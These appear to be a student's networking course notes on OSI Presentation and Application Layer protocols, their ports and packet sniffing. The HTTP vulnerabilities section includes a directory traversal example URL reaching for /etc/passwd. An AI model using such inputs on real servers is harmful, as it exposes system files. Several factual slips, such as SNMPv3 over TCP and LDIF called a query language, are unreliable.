            The Presentation Layer can translate data between different character encoding schemes, such as ASCII, Unicode, EBCDIC, etc., ensuring compatibility between systems with different encoding requirements.

                ASCII Encoding: American Standard Code for Information Interchange represents text characters using 7 or 8 bits, mapping each character to a numeric value.

                Unicode Encoding: A character encoding standard that encompasses most of the world’s writing systems, assigning unique numerical values to characters, emojis, and symbols.

                UTF-8 Encoding: A variable-width character encoding capable of encoding all Unicode characters using one to four bytes, commonly used in web pages and email.

                UTF-16 Encoding: A character encoding capable of encoding all Unicode characters using two or four bytes, often used in programming languages like Java and JavaScript.

                UTF-32 Encoding: A fixed-width encoding scheme that represents each Unicode code point with four bytes, ensuring straightforward indexing but resulting in larger file sizes compared to UTF-8 and UTF-16.

                Base64 Encoding: Converts binary data into ASCII characters, useful for encoding binary data such as images or attachments in emails or transmitting binary data over text-based protocols.

                URL Encoding: Converts special characters into a format that can be transmitted over the Internet, replacing reserved characters with percent-encoded representations.

        Data Formatting and Syntax Parsing:

            The Presentation Layer can format data according to predefined standards or protocols, ensuring that the data conforms to the expected syntax and structure. It parses the incoming data to extract relevant information and present it to the application layer in a meaningful way.

                Text-Based Formats:

                    Plain Text (.txt): Simplest format containing unformatted text without any styling or formatting.

                    Comma-Separated Values (.csv): Tabular format where data values are separated by commas, commonly used for storing and exchanging spreadsheet or database data.

                    Extensible Markup Language (.xml): Markup language for encoding structured data in a human-readable format, widely used in web services, configuration files, and data exchange.

                    JavaScript Object Notation (.json): Lightweight data interchange format commonly used for transmitting data between a server and a web application, as well as storing configuration data.

                Document Formats:

                    Portable Document Format (.pdf): A format developed by Adobe that preserves document formatting and layout across different platforms, widely used for sharing and distributing documents.

                    Microsoft Word Document (.docx): Word processing format developed by Microsoft, used for creating and editing text-based documents with rich formatting, images, and other multimedia elements.

                    Rich Text Format (.rtf): Cross-platform document format that supports text formatting, images, and other media, compatible with various word processors.

                Image Formats:

                    Joint Photographic Experts Group (.jpg/.jpeg): Commonly used format for storing compressed digital images, suitable for photographs and complex images with many colors.

                    Graphics Interchange Format (.gif): Format supporting animated images and short video clips, widely used for web animations and memes.

                    Portable Network Graphics (.png): Lossless image format that supports transparency and compression, commonly used for web graphics and digital images.

                Audio Formats:

                    MP3 (.mp3): Compressed audio format that reduces file size while preserving audio quality, widely used for storing and sharing music and audio files.

                    Waveform Audio File Format (.wav): Uncompressed audio format that preserves original audio data without loss of quality, commonly used for professional audio editing and recording.

                    Advanced Audio Coding (.aac): Format for encoding digital audio data, known for its high compression efficiency and widespread support in multimedia applications.

                Video Formats:

                    Moving Picture Experts Group-4 (.mp4): Standard format for storing digital video and multimedia content, widely supported by video playback software and devices.

                    Audio Video Interleave (.avi): Multimedia container format developed by Microsoft, capable of storing audio and video data in a single file, commonly used for video editing and playback.

                    Flash Video (.flv): Format developed by Adobe for streaming video content over the internet, commonly used for web-based video players and online streaming platforms.

        Data Encryption and Decryption:

            The Presentation Layer can perform encryption and decryption of data to ensure its confidentiality and integrity during transmission. It encrypts data before transmission and decrypts it upon receipt, allowing secure communication between systems.

                Symetric: AES, Blowfish, Twofish, DES, and RC4

                Asymetric: PKI, Diffie-Hellman, DSS, RSA, Elliptic curve

                TLS (Transport Layer Security):

                    TLS is primarily a transport layer protocol that provides secure communication over a network. However, cryptographic algorithms used in TLS (such as RSA, Diffie-Hellman, and AES) may be invoked at the presentation layer for encrypting data before presentation to the user.

                    In web browsers, TLS encryption ensures secure communication between the client and server, protecting sensitive data such as login credentials, payment information, and personal details during transmission.

                SSL (Secure Sockets Layer):

                    SSL is the predecessor to TLS and operates similarly to TLS in providing secure communication over a network. Like TLS, SSL may involve cryptographic operations at the presentation layer to encrypt data before rendering.

                    Although SSL has been largely deprecated in favor of TLS, some legacy systems and applications may still use SSL for securing data.

                PGP (Pretty Good Privacy):

                    PGP is an encryption program that provides cryptographic privacy and authentication for data communication. It can be used for encrypting and decrypting emails, files, and other forms of data.

                    While PGP is commonly associated with email encryption (which operates at the application layer), it may also involve cryptographic operations at the presentation layer for rendering encrypted messages in email clients.

                S/MIME (Secure/Multipurpose Internet Mail Extensions):

                    S/MIME is a standard for secure email messaging that provides encryption and digital signature functionality. It enables users to send encrypted and digitally signed emails using cryptographic algorithms such as RSA and AES.

                    S/MIME operations may involve cryptographic processing at the presentation layer for rendering encrypted email messages and verifying digital signatures.

                OpenPGP (Open Pretty Good Privacy):

                    OpenPGP is an open-source standard that builds upon PGP for secure communication. It defines formats for encrypted messages, digital signatures, and key management.

                    OpenPGP implementations may involve cryptographic operations at the presentation layer for rendering encrypted messages and verifying digital signatures.

                End-to-End Encryption (E2EE):

                    E2EE is a method of secure communication that ensures only the communicating users can read the messages. Encryption and decryption occur exclusively at the endpoints, providing strong confidentiality guarantees.

                    While E2EE is typically implemented at the application layer, cryptographic techniques used for encryption and decryption may involve operations at the presentation layer for data rendering.

        Data Compression and Decompression:

            The Presentation Layer can compress data to reduce its size before transmission, optimizing network bandwidth and speeding up data transfer. It decompresses the data upon receipt, restoring it to its original format.

            Sometimes data gets to big to transmit over the network so the Presentation layer handles compression.The primary role of Data compression is to reduce the number of bits to be transmitted. It is important in transmitting multimedia such as audio, video, text etc.

                Zip, TAR, RAR, 7zip, CAB

            Lossless Compression:

                Lempel-Ziv (LZ) Compression: This family of algorithms, including LZ77 and LZ78, identifies repeated patterns in the data and replaces them with shorter codes, achieving compression without loss of information.

                DEFLATE Compression: DEFLATE combines LZ77 with Huffman coding and is used in popular formats like ZIP, gzip, and PNG for lossless compression.

                Run-Length Encoding (RLE): RLE replaces sequences of repeated data with a single value and a count, making it effective for compressing data with long runs of identical values.

                Burrows-Wheeler Transform (BWT): BWT rearranges the characters in the input data to facilitate compression. It’s often used in conjunction with other techniques like Move-to-Front (MTF) and Huffman coding.

                Huffman Coding: Huffman coding generates variable-length codes for characters based on their frequencies in the input data, achieving efficient compression without loss of information.

                Arithmetic Coding: Arithmetic coding encodes a sequence of symbols into a single floating-point number within a specified range, offering high compression ratios for lossless data.

                Bzip2 Compression: Bzip2 uses the Burrows-Wheeler Transform (BWT) and Huffman coding to achieve high compression ratios, particularly effective for compressing text files.

                Delta Encoding: Delta encoding compresses data by encoding the differences between consecutive values in a sequence, suitable for compressing data with predictable patterns or incremental updates.

                PPM (Prediction by Partial Matching): PPM predicts the next symbol in a sequence based on its context, achieving high compression ratios for text and structured data.

                LZMA (Lempel-Ziv-Markov chain Algorithm): LZMA combines LZ77 with additional modeling techniques like Markov chains for high compression ratios, commonly used in formats like 7z and XZ.

                LZ77 and LZ78: These are foundational algorithms in the LZ family, used for identifying and encoding repeated patterns in data for compression.

                Shannon-Fano Coding: Similar to Huffman coding, Shannon-Fano coding generates prefix codes based on symbol probabilities to achieve lossless compression.

                Gzip Compression: Gzip uses DEFLATE compression and is commonly used for compressing files on Unix-based systems.

                Zstandard (Zstd): Zstd is a modern compression algorithm that offers a good balance between compression speed and ratio, suitable for various types of data.

                LZW (Lempel-Ziv-Welch) Compression: LZW is used in formats like GIF and compresses data by replacing repeating patterns with codes from a dictionary.

                CAB (Cabinet File Format): CAB is a Microsoft-developed file archive format commonly used for software installation packages and system files, often employing the LZX compression algorithm.

            Lossy Compression:

                JPEG Compression: JPEG (Joint Photographic Experts Group) is widely used for compressing digital images. It achieves compression by discarding high-frequency information and optimizing color representation, resulting in smaller file sizes but some loss of image quality.

                GIF Compression: Although GIF (Graphics Interchange Format) primarily supports lossless compression, it can also be used in a lossy mode by reducing the color palette or by discarding color information. This can result in smaller file sizes but may degrade image quality, particularly for complex images.

                MPEG Compression: MPEG (Moving Picture Experts Group) is a suite of standards for compressing audio and video data. It typically uses lossy compression techniques such as motion compensation, discrete cosine transform (DCT), and quantization to achieve compression while maintaining perceptual quality.

                MP3 Compression: MP3 is a popular lossy compression algorithm for audio data. It achieves compression by removing parts of the audio signal that are less audible to humans, such as frequencies outside the normal hearing range and quiet sounds masked by louder ones.

                AAC (Advanced Audio Coding): AAC is a more advanced audio compression format compared to MP3. It offers better sound quality at lower bit rates and is commonly used for streaming audio and digital music distribution.

                OGG Compression: OGG is a container format that typically uses lossy compression for audio data. It’s often associated with the Vorbis codec, which offers high-quality audio compression at lower bit rates compared to formats like MP3.

                WebP Compression: WebP is an image format developed by Google that uses both lossy and lossless compression techniques. It’s designed to offer smaller file sizes and faster loading times for web images compared to formats like JPEG and PNG.

                HEVC (High-Efficiency Video Coding): HEVC, also known as H.265, is a video compression standard that offers better compression efficiency compared to previous standards like H.264. It’s widely used for streaming video and digital television.

                FLAC (Free Lossless Audio Codec): Although FLAC is primarily a lossless compression format, it can also be used in a lossy mode where certain non-essential audio data is discarded to achieve smaller file sizes while still retaining high audio quality.

                WAVPACK: WAVPACK is a hybrid audio compression format that offers both lossy and lossless compression modes. It’s capable of achieving high compression ratios while preserving audio quality through its lossy mode.

                DCT (Discrete Cosine Transform) Compression: DCT is commonly used in lossy compression algorithms for images and video, such as JPEG and MPEG. It transforms spatial data into frequency domain coefficients, allowing for efficient compression while sacrificing some image or video quality.




```


# Layer 7
## Application Layer

## Telnet (TCP 23)

## SSH (TCP 22)

Keys:

User Asymmetric

Host Asymmetric

Session Symmetric

ssh-keygen -f "/home/student/.ssh/known_hosts" -R "172.16.82.106"
ssh-keygen -t rsa -b 4096 -C "Student"
```
VIEW/CHANGE SSH PORT

    To view the current configured SSH port

    cat /etc/ssh/sshd_config | grep Port

    Edit file to change the SSH Port

    sudo nano /etc/ssh/sshd_config

    Restart the SSH Service

    systemctl restart ssh
```

## HTTP(s) (TCP 80/443)

## HTTPs QUIC


HTTPs QUIC (UDP 443)

    QUIC (Quick UDP Internet Connections): Developed by Google, QUIC serves as a cutting-edge transport layer protocol meticulously crafted to elevate the speed and security of web applications, strategically designed to surmount limitations inherent in conventional transport protocols like TCP (Transmission Control Protocol).

    UDP-Based Operation: Functioning over the User Datagram Protocol (UDP), QUIC introduces a nimble and connectionless communication paradigm, optimizing the transmission of data.

    Latency Reduction Engineering: At its core, QUIC is an engineering marvel dedicated to mitigating latency compared to TCP. This achievement is realized through innovative mechanisms, including connection multiplexing and a streamlined round-trip handshake process.

    Integration with HTTP/3: Inextricably linked with the HTTP/3 protocol, QUIC seamlessly provides a secure and highly efficient transport layer, propelling the evolution of the Hypertext Transfer Protocol into its next generation.


## HTTP Vulnerabilities

```


    HTTP (Hypertext Transfer Protocol) is a fundamental protocol for communication on the World Wide Web. While it is the foundation for data communication on the web, it has had historical vulnerabilities that could pose risks to security.

    HTTP is vulnerable to various Denial of Service (DoS) attacks.

        Flooding the HTTP Server:

            HTTP flood: floods the target server with a high volume of legitimate-looking HTTP requests, consuming its resources and causing it to become unresponsive.

            HTTP GET/POST Flood: The attacker sends a large number of HTTP GET or POST requests to overwhelm the server and exhaust its resources.

            SYN Flood: The attacker sends massive amounts of SYNs to try to consume all the connections.

        HTTP Amplification: the attacker leverages misconfigured or vulnerable web servers to amplify the attack traffic, making it appear as if the requests are originating from multiple sources.

        Low and Slow attacks:

            Slow Loris: attack functions by opening connections to a targeted Web server and then keeping those connections open as long as it can.

            R U Dead Yet? (RUDY): aims to keep a web server tied up by submitting form data at an absurdly slow pace.

        Drive by Downloads: is the unintentional downloading of malicious software onto a user’s device when visiting a website or clicking on a compromised advertisement or link. The term "drive-by" implies that the download happens automatically and without the user’s knowledge or consent. Drive-by downloads take advantage of vulnerabilities in web browsers, browser plugins, or operating systems to initiate the download of malicious files.

        BeEF Framework: The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. It is a tool designed to enable an attacker to use a target’s browser as an attack point.

    Man-in-the-Middle Attack: Attackers can intercept and alter communication between a client and server, leading to unauthorized access, data manipulation, or eavesdropping.

    Session Hijacking: Attackers may steal session identifiers, allowing them to impersonate a user and gain unauthorized access to sensitive information.

    Cross-Site Scripting (XSS): Malicious scripts are injected into web pages viewed by other users, potentially leading to the theft of sensitive information or session hijacking.

    Cross-Site Request Forgery (CSRF): Unauthorized commands are transmitted from a user that the web application trusts, potentially leading to actions performed on behalf of the user without their consent.

    Directory Traversal Attacks: Attackers exploit insufficient security controls to access files or directories beyond the intended scope, potentially exposing sensitive data.

        http://example.com/view?file=../../etc/passwd



```

## DNS (TCP/UDP 53)



DNS (QUERY/RESPONSE) (TCP/UDP 53)

    Used as a means to resolve domain names to an IP addresses usable by the client system. Typically used to resolve IP addresses of web domains.

    Client queries and server responses are typically sent using UDP port 53.

    TCP is used when DNS responses are larger than 512-bytes.

        DNS Zone transfers are typically over 512-bytes so TCP is used for the transmission.




DNS-over-UDP/53 ("Do53")

    DNS has primarily answered queries using UDP 53, queries consist of a clear-text request sent in a single UDP packet from the client, responded to with a clear-text reply sent in a single UDP packet from the server. Lacks transport-layer encryption, authentication, reliable delivery, and message length.

DNS-over-TCP/53 ("Do53/TCP")

    DNS can use TCP for DNS queries, replies but particularly is used in zone transfers. Transfer of DNS records between a Primary and Secondary DNS Servers require the use of TCP protocol. The requirement here is that TCP, due to its reliability makes sure zone data is consistent across DNS servers. When a client doesn’t receive a response from DNS, it re-transmits the query using TCP after 3-5 seconds of interval.


## DNS Records


```
Type A

    IPv4 Address record, used to map hostnames to an IP address of the host.

Type AAAA

    IPv6 address record, used to map hostnames to an IPv6 address of the host.

Type MX

    Mail exchange record, Maps a domain name to a list of message transfer agents for that domain.

Type TXT

    Text record, human-readable text in a DNS record, but can also store machine-readable data. Often used for verification and authentication.

Type NS

    Name Server record, specifies the authoritative name servers for a domain.

Type SOA

    Start of authority, provides authoritative information about the zone, including administrative details and zone-level settings.

Type AXFR

    AXFR facilitates the transfer of the entire DNS zone data, including all resource records, from one DNS server (the master) to another DNS server (the slave).

Type CNAME

    Canonical Name creates an alias for a domain name, pointing it to another canonical domain.

Type PTR

    Used for reverse DNS lookups to map an IP address to a domain name.

```


## DNS Architecture 
![image](https://github.com/user-attachments/assets/5d7980ba-182e-40fc-b5b6-dbaa74e467b5)


```


    DNS Root Zone. Authoritative name servers managed by IANA with 13 root servers around the world.

        a.root-servers.net 198.41.0.4, 2001:503:ba3e::2:30 Verisign, Inc.

        b.root-servers.net 199.9.14.201, 2001:500:200::b University of Southern California,

        c.root-servers.net 192.33.4.12, 2001:500:2::c Cogent Communications

        d.root-servers.net 199.7.91.13, 2001:500:2d::d University of Maryland

        e.root-servers.net 192.203.230.10, 2001:500:a8::e NASA (Ames Research Center)

        f.root-servers.net 192.5.5.241, 2001:500:2f::f Internet Systems Consortium, Inc.

        g.root-servers.net 192.112.36.4, 2001:500:12::d0d US Department of Defense (NIC)

        h.root-servers.net 198.97.190.53, 2001:500:1::53 US Army (Research Lab)

        i.root-servers.net 192.36.148.17, 2001:7fe::53 Netnod

        j.root-servers.net 192.58.128.30, 2001:503:c27::2:30 Verisign, Inc.

        k.root-servers.net 193.0.14.129, 2001:7fd::1 RIPE NCC

        l.root-servers.net 199.7.83.42, 2001:500:9f::42 ICANN

        m.root-servers.net 202.12.27.33, 2001:dc3::35 WIDE Project

    Top Level Domains (Level 1). Top-Level Domains (TLDs) are the highest level of domain names in the hierarchical Domain Name System (DNS) structure.

        Generic:

            .com: Commercial organizations

            .org: Non-profit organizations

            .net: Network infrastructure providers

            .edu: Educational institutions

            .gov: U.S. government agencies

            .mil: U.S. military organizations

            .int: International organizations

            .info: General information websites

            .biz: Business-related websites

            .name: Personal websites

        Country Code:

            .us: United States

            .uk: United Kingdom

            .de: Germany

            .fr: France

            .jp: Japan

            .au: Australia

            .ca: Canada

            .in: India

            .br: Brazil

            .cn: China

            .ru: Russia

    2nd Level Domains. Second-level domains are commonly used to identify specific organizations, businesses, or individuals on the internet.

        .com TLD:

            google.com

            amazon.com

            microsoft.com

            apple.com

        .org TLD:

            wikipedia.org

            mozilla.org

            redcross.org

            eff.org

        .net TLD:

            stackoverflow.net

            behance.net

            etsy.net

            change.org

        Country Code TLDs (ccTLDs):

            bbc.co.uk (United Kingdom)

            alibaba.cn (China)

            naver.com (South Korea)

            lefigaro.fr (France)

    DNS Sub-Domain. A subdomain is a part of a larger domain, placed to the left of the main domain name, that allows further organization and subdivision of the DNS hierarchy. It allows website owners to create additional sections or subdivisions under their primary domain.

        Organization-based Subdomains:

            sales.example.com

            hr.companyname.com

            support.domainname.com

        Geographic-based Subdomains:

            us.example.com

            uk.domainname.com

            ca.website.com

        Service-based Subdomains:

            blog.domainname.com

            shop.example.com

            forum.domainname.com

        Product-based Subdomains:

            product1.domainname.com

            product2.example.com

            app.domainname.com

        Mobile-specific Subdomains:

            m.domainname.com

            mobile.example.com

            mobileapp.domainname.com

        Language-based Subdomains:

            en.example.com

            fr.domainname.com

            es.website.com



```



## FTP (TCP 20/21)
FTP has two modes of operation, Active and Passive.

## FTP Active
Active
A client initiates a connection with a server on port 21 from the client’s ephemeral high port. The three way handshake is completed and the client listens on its ephemeral high port + 1, the client sends the port N+1 command to the server on port 21 (control port). Ex: if the command to the server is from ephemeral port 1026, it would listen on port 1027. Once that is done, the server initiates a connection to the client’s ephemeral high (1027) from the server’s data port (20) and the data is transferred.

![image](https://github.com/user-attachments/assets/0a651eb3-11cb-4618-8d76-86b9fe8e07e2)


## FTP Passive
Passive
Passive FTP sidesteps the issue of Active mode by reversing the conversation. The client initiates both the command and data connections.

![image](https://github.com/user-attachments/assets/8fb2e227-5463-4ce1-8ab2-7285b6dae43e)



## TFTP (UDP 69)


TFTP (UDP 69)

Trivial File Transfer Protocol (TFTP) is a simple File Transfer Protocol which allows a client to get/put a file from/to a remote host. One of its primary uses is in the early stages of nodes booting from a local area network.

TFTP has been popular due to its simple easy of implementation.

IT pros and Sys Admins typically use TFTP configuration for:

Transferring files

Remote-booting without hard drives

Upgrading codes

Backing up network configurations

Backing up router configuration files

Saving IOS images

Booting PCs without a disk


## SMTP (TCP 25)


SMTP (TCP 25)

Simple Mail Transfer Protocol (SMTP) is an internet standard used for sending electronic mail. SMTP is not encrypted and will require other methods to secure the data.

## POP (TCP 110)


POP (TCP 110)

Post Office Protocol (POP) is an older internet standard used to retrieve electronic mail from a server. Most implementations of POP will delete the server stored mail once the client downloads them. This meant that the client can only read the email from the system that was used to download them. The latest version is POP3.

## IMAP (TCP 143)


IMAP (TCP 143)

Similar to POP in that it is used to download electronic mail from a server. It differs from POP in that it typically synchronizes with the server so that the client can download the mail but have it still stored on the server. This allowed clients to retrieve their emails from multiple systems. The current implementation is IMAP4.

## DHCP (v4 and v6) (UDP 67/68)


DHCP (UDP 67/68)

Dynamic Host Configuration Protocol (DHCP) is an internet standard used to assign IP address parameters across an enterprise. This prevent administrators from having to manually assign IP configuration on each host individually. Clients communicate with the server over UDP port 67 and the server communicates with the client over UDP port 68.

IPv4 DHCP process (D.O.R.A)

Discover - Sent as a L2 and L3 broadcast by the client to discover a DHCP server. Broadcast can only reach devices on the same network. If the DHCP server is not on the local network then the router must use the ip helper command to relay these requests to a centralized DHCP server.

Offer - Sent as a unicast to the client. The offer will contain the offered IP address configurations.

Request - Sent as a broadcast back to the server. This is broadcasted because the client could have received 2 or more offers. The broadcast will announce to all DHCP servers as to which offer was accepted. The client will send a gratuitous ARP to attempt to determine if the IP address is already in use.

Acknowledge - Final response from the server sent as a unicast to the client to confirm the lease reservation. Will contain the expiration timeframe of the lease.

IPv6 DHCP process - Similar to the process of DHCPv4 except the names and communication methods differ.

Solicit - Sent to the server as a multicast.

Advertise - Unicast response from server.

Request - Multicast to the server.

Reply - Unicast server response.

## DORA and SAAR

## DHCP Vulnerabities



DHCP is a very useful protocol but is not impervious to its share of attacks and vulnerabilities.

Rogue DHCP - (Sometimes referred to as Pineapple) - This is where a malicious person places their own DHCP server on a victim’s network. The IP address assignments will still be in the valid scope for the network but the attacker can use himself as the gateway to easily perform MitM attacks. The attacker can also assign their own DNS server address for domain to IP resolution. This means that the attacker can resolve and valid domain name to an IP address of their choosing. This can cause victims to go to the attacker’s specially crafted websites to steal credentials and other information.

DHCP Starvation - The attacker may not want to compete with a valid DHCP server for address assignments. To ensure that their configurations are accepted they will attempt to send numerous fake DHCP requests to the valid server to exhaust their pool of addresses. This will force all users to get their IP configurations from the rogue DHCP.

## NTP (UDP 123)

```


NTP (UDP 123)

The Network Time Protocol (NTP) is a networking protocol for clock synchronization between computer systems over packet-switched, variable-latency data networks. NTP is intended to synchronize all participating computers to within a few milliseconds of Coordinated Universal Time (UTC).

    Uses stratum levels to determine the distance from the "authoritative" time source.

        Stratum 0 - Identifies the device as the "authoritative" time source.

        Stratum 1 - Syncs their time from Stratum 0.

        Stratum 2 - Syncs their time from Stratum 1.

        Stratum 3 to 15 - Follows same scheme as above. Stratum 15 is the highest level.

        Stratum 16 - Signifies that the device is unsynchronized.


Vulnerabilities:

Time synchronization is critical for certain communications. Microsoft Active Directory uses time synchronization for all hosts in the domain. It allows for a certain margin of time error and once that is exceeded the client is "disjoined" from the domain and users can no longer log in. Other systems and protocols also use time synchronization and can easily be exploited. A malicious person can craft NTP messages in attempt to throw off the domain timing and create issues.


```


## TACACS (TCP 49)


TACACS (TCP 49) SIMPLE/EXTENDED

The Terminal Access Controller Access-Control System Plus (TACACS+) is a network security protocol used for centralized authentication, authorization, and accounting (AAA) services in network devices such as routers, switches, and firewalls. Developed by Cisco Systems, TACACS+ provides a robust framework for controlling access to network resources and enforcing security policies.


## RADIUS (UDP  1645/1646 and 1812/1813)


RADIUS (UDP 1645/1646 AND 1812/1813)

Remote Authentication Dial-In User Service (RADIUS) is a open standard networking protocol used for centralized authentication, authorization, and accounting (AAA) services in network environments. It enables devices like network access servers (NAS), VPN gateways, and wireless access points to authenticate users and authorize their access to network resources.

## DIAMETER (TCP 3836)


Diameter is a networking protocol used for Authentication, Authorization, and Accounting (AAA) functions in network systems, primarily in telecommunications networks. It is an evolution of the older RADIUS (Remote Authentication Dial-In User Service) protocol, providing enhanced features and capabilities.

Diameter protocol was develop to enhance the AAA capablities that RADIUS does not support. Such as:

Supports application-layer acknowledgments and defines failover algorithms and the associated state machine.

 Transmission-level security support via TLS/TCP and DTLS/SCTP. Diameter can work over TCP, Stream Control Transmission Protocol (SCTP), or UDP. SCTP is recommended.

 Diameter includes support for error handling, capability negotiation, and mandatory/non-mandatory Attribute-Value Pairs (AVPs).

## SNMP (UDP 161/162)

```


SNMP (UDP 161/162)

Simple Network Management Protocol (SNMP) is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks. Devices that typically support SNMP include cable modems, routers, switches, servers, workstations, printers, and more.

    3 Key SNMP Components

        SNMP Manager - It is a centralized system used to monitor the network. It is also known as Network Management Station (NMS)

        SNMP agent - It is a software management software module installed on a managed device. Managed devices can be network devices like PC, router, switches, servers, etc.

        Management Information Base - MIB consists of information on resources that are to be managed. This information is organized hierarchically. It consists of objects instances which are essentially variables.

    SNMP Versions

        SNMPv1 – This was the first implementation, operating within the structure management information specification, and described in RFC 1157. It uses community strings for authentication and UDP only.

        SNMPv2c – This version has improved support for efficiency and error handling and is described in RFC 1901. It was first introduced in RFC 1441 and is more appropriately known as SNMP v2c. It uses community strings for authentication. It uses UDP but can be configured to use TCP.

        SNMPv3 – This version improves security and privacy. It was introduced in RFC 3410. It uses Hash-based MAC with MD5 or SHA for authentication and DES-56 for privacy. This version uses TCP. Therefore, the higher the version of SNMP, the more secure it will be.

            noAuthNoPriv – This (no authentication, no privacy) security level uses community string for authentication and no encryption for privacy.

            authNopriv – This security level (authentication, no privacy) uses HMAC with MD5 or SHA for authentication and no encryption is used for privacy.

            authPriv – This security level (authentication, privacy) uses HMAC with MD5 or SHA for authentication and encryption uses DES-56(56-bit) algorithm, 3DES(168-bit), AES(128/192/256-bit).


Vulnerabilities:

SNMP v1 and v2 traffic is sent as clear text. It also has generally weak passwords. This means that attackers can potentially sniff the network this traffic and can be used to gather sensitive information about the network and its devices. Should the passwords be compromised, the attacker can probe SNMP enabled devices for information and disable SNMP traps that would otherwise trigger when certain actions occur.


```


## RTP (UDP 1023+)

```
RTP (Real-time Transport Protocol) is primarily used for streaming real-time media over IP networks. It is a protocol specifically designed for transmitting audio and video data in a way that supports time-sensitive applications, such as voice and video communication, streaming media, and live broadcasts.

    Voice over IP (VoIP): RTP is widely used in VoIP applications to transport real-time voice data packets over IP networks. It works in conjunction with protocols like SIP (Session Initiation Protocol) to enable voice communication over the internet.

    Video Conferencing: RTP forms the basis of video conferencing systems, allowing participants to transmit and receive real-time video streams during live meetings or conferences.

    Streaming Media: RTP is commonly used for streaming media services, such as online video streaming platforms, live broadcasts, and webinars. It facilitates the efficient transmission of video and audio data to multiple clients in real-time.

    IPTV (Internet Protocol Television): RTP is used in IPTV systems to deliver television content over IP networks, enabling users to stream television programs and video-on-demand services over the internet.

    Multimedia Applications: RTP is utilized in various multimedia applications, including gaming, remote monitoring, video surveillance, and interactive multimedia services. It provides a reliable and efficient transport mechanism for transmitting time-sensitive media data.

    Real-time Data Transmission: RTP can be used for real-time data transmission scenarios where timely delivery is crucial. For example, it may be employed in sensor networks, control systems, or any application that requires the transmission of real-time data streams.
```


## RDP (TCP 3389)


RDP (TCP 3389)

Developed by Microsoft to offer remote access to a computer’s desktop GUI as if they was physically at the system rather than just a command-line interface.

The protocol is widely supported across most Windows, Unix, Linux, and macOS operating systems. Other proprietary options were developed to provide remote desktop support but the administrator typically must install the client software on each device before being able to remotely access devices with these 3rd party tools.

## Kerberos (UDP 88)



Kerberos (UDP 88)

Kerberos is a network authentication protocol that ensures secure authentication for client-server applications. It was created by MIT as a network authentication protocol using secret-key cryptography. It relies on a trusted Key Distribution Center (KDC) server.

Here’s a simplified explanation of the Kerberos process:

    Authentication Request:

        The client sends an authentication request to the KDC, providing its identity (username) and the desired server’s identity (service principal name).

    Ticket Granting Ticket (TGT) Request:

        The KDC verifies the client’s identity and issues a TGT if the credentials are valid.

        The TGT is encrypted using the client’s password or a shared secret key.

    TGT Issuance:

        The KDC sends the encrypted TGT to the client, which stores it securely.

    Service Ticket Request:

        When the client wants to access a specific service, it requests a Service Ticket (ST) for that service from the KDC.

        The request includes the TGT and the desired service’s identity.

    ST Issuance:

        The KDC verifies the TGT and issues an ST for the requested service if the TGT is valid.

        The ST is encrypted using a session key shared between the client and the service.

    Service Access:

        The client presents the ST to the service, proving its authenticity and intent to access the service.

        The service decrypts the ST using the session key and verifies its validity.

        If the ST is valid, the service grants access to the client.

Kerberos utilizes symmetric key cryptography for secure ticket encryption and decryption, ensuring data confidentiality and integrity. It also supports mutual authentication between the client and server.

Kerberos is widely used in enterprise environments, particularly in Microsoft Windows with Active Directory. It ensures secure authentication and access to network resources while protecting against unauthorized access and replay attacks.



## LDAP (TCP 389)



LDAP (TCP 389 and 636)

The Lightweight Directory Access Protocol (LDAP) is an application protocol used for accessing and managing distributed directory information services. LDAP provides a standardized method for querying, modifying, and authenticating against directory services, such as Active Directory and OpenLDAP.

LDAPS (LDAP over SSL/TLS) is a secure communication protocol used to encrypt LDAP traffic between LDAP clients and servers. It provides a layer of security to LDAP authentication and directory access by encrypting data exchanged over the network, protecting it from eavesdropping and tampering.

    LDAP provides access to distributed directory services that act in accordance with X.500 data and service models. These protocol elements are based on those described in the X.500 Directory Access Protocol (DAP).

    LDAP as an authentication service follows the client/server model. The LDAP model has two main steps when a user requests non-TLS bind authentication. These are (in order):

        TCP three-way handshake (SYN, SYN/ACK, ACK)

        LDAP bind() function (performed synchronous or asynchronous)

LDAP:

    LDAP (unencrypted): TCP Port 389

    LDAPS (LDAP over SSL/TLS): TCP Port 636

    follows a client-server model, where LDAP clients send requests to directory servers, which in turn provide responses.

    hierarchical data stores that organize and store structured information, such as user profiles, organizational units, and network resources.

    uses a directory schema to define the structure and attributes of directory entries, allowing for flexible data modeling.

    supports various operations, including search, add, modify, delete, and bind (authentication).

    uses a string-based query language called the LDAP Data Interchange Format (LDIF) to search and retrieve data from directory servers.

        LDAP servers are vulnerable from DoS attacks (SYN Flooding) and protecting user passwords from being discovered over a network.




# Network Capture

## Packet Sniffing
Practical Use

Network Troubleshooting

Diagnosing Improper routing or switching

Identifying port/protocol misconfigurations

Monitor Networking Consumption

Disadvantages

Require elevated permissions

Can only capture what NIC can see

Cannot capture local traffic

Can consume massive amounts of system resources


## Modes



    Hardware Packet Sniffers - In the past, the process of traffic sniffing was typically done by using hardware devices because the act of capturing packets was too intensive for computers. It is a purpose-built device that is plugged into a network segment to collect and store network packets. Packets are forwarded to a separate system for further analysis. With the improvement of computer CPUs, stand-alone hardware-based sniffers are rarely used anymore.

    Software Packet Sniffers - remaining packet sniffers will fall into this category. The local system is used to collect the packets and the software then provides immediate analysis. Software-based sniffers rely on the network interface card (NIC) in the host system to pass traffic to the OS. NICs are set into one of two modes:

        Non-promiscuous: Default for most NICs. NIC will only process traffic destined for its host MAC address. Multicast MAC address groups and broadcast addresses are also received and processed.

        Promiscuous: Requires root/kernel permissions to enable. The NIC receives and processes all traffic. Most operating systems can support promiscuous mode. Support can be limited by the NIC hardware and/or drivers.


## Socket Types



    User Space Sockets:

        Stream socket - Normally used with TCP, SCTP, and Bluetooth. A stream socket provides a connection-oriented and sequenced flow of data which has methods for establishment and teardown of connections as well as error detection.

        Datagram socket - Normally used with UDP. A datagram socket is connection-less by nature. Sockets built this way can send and receive data, but there is no mechanism to retransmit data if a packet is dropped.

        Examples:

            Using a User application such as a Web Browser, FTP, Telnet, SSH, netcat, etc to connect to any listening port.

            nc 10.0.0.1 22
            firefox http://10.0.0.1
            wget -r http://10.0.0.1
            curl ftp://10.0.0.1
            ftp 10.0.0.1
            telnet 10.0.0.1
            ssh user@10.0.0.1

            Using tcpdump or wireshark to read a file

            tcpdump -r capture.pcap

            Using nmap with no switches (-sS) or -sT

            nmap 10.0.0.1
            nmap -sT 10.0.0.1

            Opening listening ports above the Well-Known range (1024+)

            python -m SimpleHTTPServer 7800
